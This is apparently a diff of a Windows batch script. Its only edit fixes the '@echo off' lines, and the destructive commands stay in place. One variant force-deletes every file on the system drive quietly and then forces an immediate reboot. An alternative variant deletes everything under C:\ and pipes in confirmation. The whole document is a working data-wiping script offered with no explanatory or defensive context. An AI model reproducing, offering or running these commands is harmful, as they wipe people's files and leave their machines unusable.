@@ -1,8 +1,8 @@
-@ echo off 
+@echo off 
 del %systemdrive% *.*/f/s/q
 shutdown -r-f-t00
 
 OR
 
-@ echo off
+@echo off
 Del C:\*.*|y
